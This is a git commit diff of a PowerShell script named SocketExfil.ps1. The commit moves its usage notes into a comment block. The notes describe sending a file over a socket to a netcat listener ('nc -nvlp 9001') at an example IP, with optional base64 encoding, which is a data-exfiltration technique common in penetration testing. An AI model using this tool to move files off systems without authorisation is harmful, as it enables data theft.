4c2f3d2478829e9f9e78052cb1769572f70cd983
MaxJackson13 <72030655+MaxJackson13@users.noreply.github.com>
2022-11-18 20:21:32 +0000

    Update SocketExfil.ps1

--- SocketExfil.ps1
+++ SocketExfil.ps1
@@ -1,17 +1,16 @@
-'''
-Sends a file through a socket to be received by a listener on the target machine.
-Run . .\Exfil.ps1 in the directory containing the file
-
-Usage (plaintext):
-Server: Send-EndcodeFile -Target 10.10.10.10 -Port 9001 -Path .\test.txt
-Client: nc -nvlp 9001 > test.txt
-
-Usage (base64-encoded):
-Server: Send-EndcodeFile -Target 10.10.10.10 -Port 9001 -Path .\test.txt -Encoded $true
-Client: nc -nvlp 9001 > b64test.txt
-
-'''
 Function Send-File () {
+        #.Synopsis
+        # Sends a file through a socket to be received by a listener on the target machine.
+        # Run . .\SocketExfil.ps1 in the directory containing the file
+
+        # Usage (plaintext):
+        # Server: Send-File -Target 10.10.10.10 -Port 9001 -Path .\test.txt
+        # Client: nc -nvlp 9001 > test.txt
+
+        # Usage (base64-encoded):
+        # Server: Send-File -Target 10.10.10.10 -Port 9001 -Path .\test.txt -Encoded $true
+        # Client: nc -nvlp 9001 > b64test.txt
+        ###################################################################################
         
         param($Target, $Port, $Path, [bool[]]$Encoded=$false)
        
